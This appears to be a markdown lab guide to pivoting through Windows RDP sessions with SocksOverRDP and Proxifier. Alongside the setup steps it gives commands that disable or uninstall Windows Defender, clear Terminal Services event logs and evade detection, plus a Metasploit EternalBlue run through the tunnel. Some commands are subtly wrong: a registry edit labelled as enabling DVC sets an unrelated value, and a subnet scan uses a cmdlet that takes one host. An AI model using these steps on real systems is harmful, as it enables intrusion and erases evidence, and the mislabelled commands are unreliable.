# 🛰️ SocksOverRDP: A Comprehensive Guide to Windows Pivoting

---

## 🔍 Overview
[!ABSTRACT] This document provides a detailed guide on using SocksOverRDP for pivoting in Windows environments, including setup steps, troubleshooting tips, performance optimization, and security considerations. SocksOverRDP allows you to tunnel traffic through an RDP session, making it useful for scenarios where other pivoting techniques are blocked.

---

## 📝 Introduction
[!INFO] SocksOverRDP is a tool that enables SSH-style SOCKS proxying over RDP channels, facilitating pivoting within Windows environments. It consists of two main components: `SocksOverRDP-Plugin.dll` and `SocksOverRDP-Server.exe`.

---

## 🛠️ Installation and Setup

### 🔧 Prerequisites
[!INFO] Ensure you have the following:
- RDP access to a target machine.
- Administrator privileges on the target.

### 🔑 Obtaining Files
[!NOTE] Download or obtain `SocksOverRDP-Plugin.dll` and `SocksOverRDP-Server.exe`.

### 🛠️ Installation Steps

1. **DLL Registration:**
   [!SUCCESS] Use regsvr32 to register the DLL:
   ```bash
   regsvr32 SocksOverRDP-Plugin.dll
   ```

2. **Starting Server:**
   [!SUCCESS] Launch `SocksOverRDP-Server.exe` to start listening on a local port.

### 🛠️ Proxifier Configuration

1. **Proxifier Installation:**
   [!SUCCESS] Install and configure Proxifier.

2. **Proxy Settings:**
   [!CHECK] Add the SOCKS proxy in Proxifier:
   - Profile → Proxy Servers
     ```
     127.0.0.1:1080 (SOCKS5)
     ```

### 🛠️ Enabling RDP DVC

1. **Modify Registry:**
   [!SUCCESS] Edit the registry key to enable DVC:
   ```powershell
   reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fSingleSessionPerUser /t REG_DWORD /d 0x0 /f
   ```

2. **Restart RDP Service:**
   [!SUCCESS] Restart the Remote Desktop services:
   ```powershell
   net stop TermService
   net start TermService
   ```

---

## 🧐 Configuration and Verification

### 🔍 Checking Connectivity
[!CHECK] Ensure you can connect to the target machine via RDP.

```powershell
Test-NetConnection 172.16.5.19 -Port 3389
```

### 🔍 Check Credentials
[!WARNING] Verify your credentials are correct:
```plaintext
victor:pass@123 (not victor@domain)
```

### 🔍 Certificate Issues
[!NOTE] Always accept untrusted certificates.

### 🔍 RDP Service Status
[!SUCCESS] Ensure RDP is enabled and Remote Desktop is allowed on the target machine.

---

## 📜 Troubleshooting

### 💡 SOCKS Proxy Issues
```powershell
# Problem: SOCKS listener not starting
# netstat shows no 127.0.0.1:1080 listener

# Solutions:
1. Verify plugin registration:
   regsvr32.exe SocksOverRDP-Plugin.dll
   # Should show success dialog

2. Check RDP session status:
   # Plugin only works within active RDP session
   # Verify connection to 172.16.5.19

3. Run server as Administrator:
   # SocksOverRDP-Server.exe requires admin rights
   Right-click → Run as Administrator

4. Port conflicts:
   netstat -an | findstr 1080
   # Kill processes using port 1080
   taskkill /f /pid <PID>
```

### 💡 Proxifier Configuration Issues
```powershell
# Problem: Proxifier not routing traffic
# Applications bypass proxy

# Solutions:
1. Run Proxifier as Administrator:
   Right-click Proxifier.exe → Run as Administrator

2. Check proxy configuration:
   # Profile → Proxy Servers
   127.0.0.1:1080, SOCKS5

3. Verify proxification rules:
   Profile → Proxification Rules
   Default rule: All applications via SOCKS proxy

4. Test proxy connectivity:
   Profile → Proxy Checker
   # Test connection to 127.0.0.1:1080
```

### 💡 Windows Defender Interference
```powershell
# Problem: Files get deleted automatically
# Defender quarantines SocksOverRDP files

# Solutions:
1. Complete Defender disable:
   Windows Security → Virus & threat protection
   Turn OFF: Real-time, Cloud-delivered, Automatic sample

2. Add exclusions:
   # Virus & threat protection → Exclusions
   C:\Users\htb-student\Desktop

3. PowerShell disable:
   Set-MpPreference -DisableRealtimeMonitoring $true
   Set-MpPreference -DisableArchiveScanning $true
   Set-MpPreference -DisableBehaviorMonitoring $true

4. Uninstall Defender (on DC):
   Uninstall-WindowsFeature -Name Windows-Defender
```

---

## 🚀 Performance Optimization

### 🔧 RDP Performance Settings
```plaintext
# In mstsc.exe → Experience tab:
1. Connection speed: Modem (56 kbps)
2. Uncheck:
   - Desktop background
   - Font smoothing
   - Desktop composition
   - Show contents of windows while dragging
3. Check:
   - Persistent bitmap caching
```

### 🔧 Proxifier Performance
```plaintext
# In Proxifier:
1. Profile → Advanced → Performance
2. Enable: Process faster connections
3. Increase: Connection timeout (30 seconds)
4. Enable: Handle direct connections internally
```

### 🔧 Network Optimization
```powershell
# Reduce RDP bandwidth usage
# In RDP session:
1. Lower screen resolution
2. Reduce color depth (16-bit)
3. Disable audio redirection
4. Disable clipboard sharing
5. Disable drive redirection
```

---

## ⚠️ Security Considerations

### 🛡️ OPSEC Implications
[!WARNING] 
1. **Registry Modifications** - DLL registration leaves traces.
2. **Process Artifacts** - Proxifier and SocksOverRDP processes visible.
3. **Network Signatures** - DVC tunnel traffic patterns.
4. **File Artifacts** - Tool binaries on disk.
5. **Event Logs** - RDP connection logs, authentication events.

### 🛡️ Detection Evasion
```powershell
# Minimize detection footprint:
1. Use legitimate RDP sessions
2. Disable unnecessary logging
3. Clean up files after use
4. Use standard RDP ports (3389)
5. Limit session duration
```

### 🛡️ Cleanup Procedures
```powershell
# After completion:
1. Unregister DLL:
   regsvr32.exe /u SocksOverRDP-Plugin.dll

2. Remove files:
   del SocksOverRDP-Plugin.dll
   del SocksOverRDP-Server.exe
   rmdir /s "Proxifier PE"

3. Clear event logs (if possible):
   wevtutil cl "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational"

4. Re-enable Windows Defender:
   Set-MpPreference -DisableRealtimeMonitoring $false
```

---

## 🚀 Alternative Windows Pivoting Methods

### 🔍 Comparison with Other Techniques
| **Tool** | **Requirements** | **Stealth** | **Performance** | **Complexity** |
|----------|------------------|-------------|-----------------|----------------|
| **SocksOverRDP** | RDP Access | High | Medium | Medium |
| **SSH Tunnel** | SSH Client | Low | High | Low |
| **Netsh Portproxy** | Admin Rights | Medium | High | Low |
| **PowerShell Remoting** | WinRM Enabled | Medium | Medium | High |
| **Chisel** | Binary Transfer | High | High | Medium |

### 🔍 When to Use SocksOverRDP
✅ **Windows-only environments**
✅ **RDP access available**
✅ **SSH/other tools blocked**
✅ **Need stealth tunneling**
✅ **Multiple RDP hops required**

### 🔍 Limitations
❌ **Requires RDP access**
❌ **Windows Defender interference**
❌ **DLL registration traces**
❌ **Performance overhead**
❌ **Complex multi-step setup**

---

## 🚀 Integration with Other Tools

### 🔧 Metasploit Integration
```bash
# Use SocksOverRDP with Metasploit
setg Proxies socks5:127.0.0.1:1080

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 172.16.6.155
exploit
```

### 🔧 Nmap Through RDP Tunnel
```bash
# Install Linux tools on Windows (WSL)
Test-NetConnection 172.16.6.0/24 -Port 80,443,3389

# Or use PowerShell equivalents
# Through Proxifier (configure proxy settings)
```

### 🔧 Proxifying Other Tools
```powershell
# Configure tools like Burp Suite or Wireshark to use SOCKS5 proxy:
127.0.0.1:1080
```

---

## 📚 References and Resources

- [SocksOverRDP GitHub](https://github.com/SocksOverRDP)
- [Proxifier Documentation](http://proxifier.com/)
- [Windows RDP Configuration Guide](https://docs.microsoft.com/en-us/windows-server/remote/remote-desktop-services/rds-tsg-windows-server)

---

## 🔐 Conclusion
[!ABSTRACT] SocksOverRDP provides a powerful way to pivot within Windows environments by leveraging RDP channels. By following the steps outlined in this guide, you can effectively use SocksOverRDP for various security and penetration testing scenarios while minimizing detection risks.

---


# 📄 License & Acknowledgements
[!NOTE] This document is intended for educational purposes only and should be used responsibly. Do not engage in unauthorized activities or violate any laws. Always obtain proper authorization before conducting any security assessments.

---

# 💡 Contributing
Contributions are welcome! Please fork the repository, make your changes, and submit a pull request. For major changes, please open an issue first to discuss the proposed changes. Thank you for contributing!

---


# 📝 Version History

| Date       | Changes                   |
|------------|----------------------------|
| 2023-10-18 | Initial version created    |
| 2024-02-26 | Updated configuration steps|

---

# 📧 Contact
For any questions or feedback, please reach out to:

[Your Name]
Email: [your-email@example.com]  
GitHub: [@your-github-handle]

---


## 🔐 License

This project is licensed under the MIT License. See the LICENSE file for details.

---


End of Document 📜